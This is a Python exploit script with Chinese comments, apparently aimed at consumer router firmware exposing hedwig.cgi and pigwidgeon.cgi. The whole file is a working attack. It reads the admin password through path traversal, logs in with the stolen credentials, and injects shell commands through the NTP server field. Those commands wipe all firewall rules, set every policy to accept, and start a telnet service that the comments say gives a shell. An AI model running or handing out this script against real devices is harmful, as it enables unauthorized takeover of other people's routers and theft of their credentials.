#!/usr/bin/env python3
# pylint: disable=C0103
#coding=utf-8
# pip3 install requests lxml
#
import hmac
import json
import sys
from urllib.parse import urljoin
from xml.sax.saxutils import escape
import lxml.etree
import requests



COMMAND = ";".join([
    "iptables -F",  # 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。
    "iptables -X",  #删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。
    "iptables -t nat -F",  #对指定nat链表进行 -F操作
    "iptables -t nat -X",   # 定义地址转换的，也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING
    "iptables -t mangle -F", #修改报文原数据，是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING
    "iptables -t mangle -X",
    "iptables -P INPUT ACCEPT",  # -P指定要匹配的数据包协议类型 INPUT链 ：处理输入数据包 ACCEPT ：接收数据包
    "iptables -P FORWARD ACCEPT",#FORWARD链 ：处理转发数据包。
    "iptables -P OUTPUT ACCEPT",   #OUTPUT链 ：处理输出数据包。
    "telnetd -p 23090 -l /bin/date"  # 开启telnet服务。  之后执行命令：telnet 192.168.0.1 23090 拿到shell
    ])
try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except:
    pass

TARGET = sys.argv[1]
session = requests.Session()
session.verify = False

############################################################获取用户名密码

print("Get password...")

headers = {"Content-Type": "text/xml"}
cookies = {"uid": "whatever"}
data = """<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
</module>
</postxml>"""

resp = session.post(urljoin(TARGET, "./hedwig.cgi"), headers=headers, cookies=cookies, data=data)
# print(resp.text)

# getcfg: <module>...</module>
# hedwig: <?xml version="1.0" encoding="utf-8"?>
#       : <hedwig>...</hedwig>
accdata = resp.text[:resp.text.find("<?xml")]

admin_pasw = ""

tree = lxml.etree.fromstring(accdata)
accounts = tree.xpath("/module/device/account/entry")
for acc in accounts:
    name = acc.findtext("name", "")
    pasw = acc.findtext("password", "")
    print("name:", name)
    print("pass:", pasw)
    if name == "Admin":
        admin_pasw = pasw

if not admin_pasw:
    print("Admin password not found!")
    sys.exit()

############################################################  通过/authentication.cgi获取key
#登录方式：
#1.发送get请求/authentication.cgi
#将获取到{"status": "ok", "errno": null, "uid": "MPxUAS6sZp",
#        "challenge": "c75a69e4-d1fe-4a47-b152-b494c9174316", "version": "0204"}
#2.使用uid键值对作为cookie，password与username+challenge作md5
#3.发送post请求到/authentication.cgi
print("Auth challenge...")
resp = session.get(urljoin(TARGET, "/authentication.cgi"))
# print(resp.text)

resp = json.loads(resp.text)
if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()

print("uid:", resp["uid"])
print("challenge:", resp["challenge"])

session.cookies.update({"uid": resp["uid"]})

print("Auth login...")
user_name = "Admin"
user_pasw = admin_pasw

data = {
    "id": user_name,
    "password": hmac.new(user_pasw.encode(), (user_name + resp["challenge"]).encode(), "md5").hexdigest().upper()
}
resp = session.post(urljoin(TARGET, "/authentication.cgi"), data=data)
# print(resp.text)

resp = json.loads(resp.text)
if resp["status"].lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")

############################################################设置cookie：uid=MPxUAS6sZp

data = {"SERVICES": "DEVICE.TIME"}
# POST /getcfg.php HTTP/1.1
# Host: 192.168.0.1
# User-Agent: python-requests/2.18.4
# Accept-Encoding: gzip, deflate
# Accept: */*
# Connection: keep-alive
# Cookie: uid=MPxUAS6sZp
# Content-Length: 20
# Content-Type: application/x-www-form-urlencoded
#
# SERVICES=DEVICE.TIME
resp = session.post(urljoin(TARGET, "/getcfg.php"), data=data)  #文件执行
print(resp.text)

tree = lxml.etree.fromstring(resp.content)   #设置要发送的xml文件的service字段和要执行的命令
tree.xpath("//ntp/enable")[0].text = "1"
tree.xpath("//ntp/server")[0].text = "metelesku; ("+COMMAND+") & exit; "
tree.xpath("//ntp6/enable")[0].text = "1"

############################################################
#
print("hedwig")
#hedwig.cgi文件里面执行fatlady.php文件，设置service位和TDEVICE.TIME可以执行执行TDEVICE.TIME.xml.php
#TDEVICE.TIME.xml.php文件可以执行命令
headers = {"Content-Type": "text/xml"}
data = lxml.etree.tostring(tree)
resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, data=data)
# print(resp.text)

tree = lxml.etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")

############################################################
#激活服务
print("pigwidgeon")

data = {"ACTIONS": "SETCFG,ACTIVATE"}

resp = session.post(urljoin(TARGET, "/pigwidgeon.cgi"), data=data)
# print(resp.text)

tree = lxml.etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")
